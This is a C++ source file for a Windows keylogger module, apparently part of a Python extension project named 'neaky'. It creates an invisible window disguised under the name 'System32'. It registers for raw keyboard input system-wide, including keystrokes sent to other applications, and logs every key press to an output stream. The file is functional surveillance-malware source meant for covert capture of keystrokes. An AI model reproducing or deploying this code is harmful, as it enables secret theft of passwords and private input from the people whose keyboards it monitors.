#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>

#include <neaky/utils.h>
#include "keylog.h"

#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include "../neakymodule.h"

extern "C" HINSTANCE hInst;

// 全局变量:
static WCHAR szTitle[] = L"System32";                  // 标题栏文本
static WCHAR szWindowClass[] = L"System32";            // 主窗口类名
static std::ostream* outStream;
static HWND hWnd;

// 此代码模块中包含的函数的前向声明:
static ATOM                MyRegisterClass(HINSTANCE hInstance);
static LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);

static BOOL KeyLoggerInit(std::ostream* os)
{
    ATOM res = MyRegisterClass(hInst);
    if (res == NULL)
    {
        PyErr_SetString(NeakyError, "RegisterClassExW failed.");
        return FALSE;
    }

    hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInst, nullptr);
    
    if (hWnd == NULL)
    {
        PyErr_SetString(NeakyError, "CreateWindowW failed.");
        return FALSE;
    }
    outStream = os;
    //ShowWindow(hWnd, SW_SHOWNORMAL);
    //UpdateWindow(hWnd);
    return TRUE;
}

static void KeyLoggerFini()
{
    DestroyWindow(hWnd);
    outStream = NULL;
}

//
//  函数: MyRegisterClass()
//
//  目标: 注册窗口类。
//
static ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = NULL;
    wcex.hCursor = NULL;
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = NULL;

    return RegisterClassExW(&wcex);
}


RAWINPUTDEVICE rid;

//
//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  目标: 处理主窗口的消息。
//
//  WM_COMMAND  - 处理应用程序菜单
//  WM_PAINT    - 绘制主窗口
//  WM_DESTROY  - 发送退出消息并返回
//
//
static LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
    {
        rid.dwFlags = RIDEV_NOLEGACY | RIDEV_INPUTSINK | RIDEV_NOHOTKEYS;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
        rid.usUsagePage = 1;											    // raw keyboard data only
        rid.usUsage = 6;
        rid.hwndTarget = hWnd;
        if (RegisterRawInputDevices(&rid, 1, sizeof(rid)) == FALSE)
        {
            puts("RawInputKeyLogger: RegisterRawInputDevices Failed !");
            ShowError();
        }
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    case WM_INPUT: {
        UINT dwSize;
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1) {
            PostQuitMessage(0);
            break;
        }

        LPBYTE lpb = new BYTE[dwSize];
        if (lpb == NULL) {
            PostQuitMessage(0);
            break;
        }

        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize) {
            delete[] lpb;
            PostQuitMessage(0);
            break;
        }

        PRAWINPUT raw = (PRAWINPUT)lpb;
        UINT Event;

        Event = raw->data.keyboard.Message;

        switch (Event) {

        case WM_KEYDOWN: {
            LogKeyStoke(outStream, raw->data.keyboard.VKey);
            break;
        }// end WM_KEYDOWN

        default:
            break;
        }//end switch
        delete[] lpb;	// free this now
        break;

    }// end case WM_INPUT
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        BeginPaint(hWnd, &ps);
        EndPaint(hWnd, &ps);
    }
    break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

KeyLoggerInterface RawInputKeyLogger = {
    KeyLoggerInit,
    KeyLoggerFini
};